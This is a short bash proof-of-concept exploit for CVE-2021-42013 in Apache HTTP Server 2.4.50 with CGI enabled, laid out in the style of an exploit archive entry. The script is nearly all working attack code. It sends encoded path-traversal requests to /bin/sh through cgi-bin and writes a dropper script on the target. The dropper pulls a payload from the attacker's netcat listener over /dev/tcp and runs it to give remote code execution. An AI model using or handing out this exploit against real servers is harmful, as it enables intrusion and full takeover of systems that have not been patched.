# Exploit: Apache HTTP Server 2.4.50 - Remote Code Execution (RCE) (2)
# Credits: Ash Daulton & cPanel Security Team
# Date: 24/07/2021
# Exploit Author: TheLastVvV.com
# Vendor Homepage:  https://apache.org/
# Version: Apache 2.4.50 with CGI enable
# Tested on : Debian 5.10.28
# CVE : CVE-2021-42013

#!/bin/bash

echo 'PoC CVE-2021-42013 reverse shell Apache 2.4.50 with CGI'
if [ $# -eq 0 ]
then
echo  "try: ./$0 http://ip:port LHOST LPORT <payload_path>"
exit 1
fi

LHOST=$2
LPORT=$3
PAYLOAD=$4

nc -w 3 -l -p $LPORT < $PAYLOAD &

curl "$1/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh" -d "echo Content-Type: text/plain; echo; echo 'cat < /dev/tcp/$LHOST/$LPORT > /tmp/payload.bin; chmod +x /tmp/payload.bin; /tmp/payload.bin &' > /tmp/dropper.sh" && curl "$1/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh" -d "echo Content-Type: text/plain; echo; bash /tmp/dropper.sh; echo ':)';"

#usage chmod -x CVE-2021-42013.sh
#./CVE-2021-42013_reverseshell.sh http://ip:port/ LHOST LPORT
